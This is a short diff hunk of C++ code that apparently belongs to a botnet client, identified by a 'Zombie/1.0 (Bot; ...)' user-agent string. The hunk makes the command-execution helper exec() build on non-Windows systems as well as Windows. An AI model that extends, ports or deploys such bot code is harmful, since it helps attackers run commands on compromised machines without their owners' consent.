@@ -58,7 +58,11 @@ std::string UAG_SV = "Zombie/1.0 (Bot; " + bot_id + ")";
 std::string exec(const char* cmd) {
     char buffer[128];
     std::string result = "";
+#ifdef _WIN32
     FILE* pipe = _popen(cmd, "r");
+#else 
+    FILE* pipe = popen(cmd, "r");
+#endif
 
     if (!pipe) throw std::runtime_error("popen() failed!");
 
